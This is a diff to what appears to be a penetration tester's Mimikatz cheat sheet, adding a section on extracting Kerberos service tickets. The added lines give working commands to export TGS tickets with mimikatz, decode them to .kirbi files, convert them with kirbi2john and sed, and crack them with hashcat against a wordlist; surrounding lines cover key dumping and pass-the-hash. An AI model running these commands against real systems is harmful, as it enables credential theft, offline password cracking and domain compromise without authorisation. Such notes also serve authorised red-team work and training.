@@ -45,6 +45,33 @@ Keys are not the same as tickets, they are encryption keys that Kerberos uses fo
 C:\> mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
 ```
 
+### Extracting Kerberos TGS Tickets
+```batch
+C:\> mimikatz.exe privilege::debug
+	base64 /out:true
+	kerberos::list /export
+```
+> Without `base64 /out:true` it will extract to a `.kirbi` file, writing them to disk on the target machine (so will need to be exfiltrated)
+
+As the base64 export is column wrapped, we need to prepare it for cracking:
+```bash
+# Remove any new lines and whitespace
+echo "<base64 blob>" |  tr -d \\n
+# Place the output into a file
+
+# Convert to a .kirbi file
+cat encoded_file | base64 -d > user.kirbi
+
+# Conver it with john
+python kirbi2john.py user.kirbi
+
+# Modify the crack file for hashcat
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > user_tgs_hashcat
+
+# Crack it
+hashcat -m 13100 user_tgs_hashcat rockyou.txt
+```
+
 ### Pass-the-Hash
 Using the `sekurlsa::pth` module we can perform a pass-the-hash attack. It starts a process using the user's hash.
 ```batch
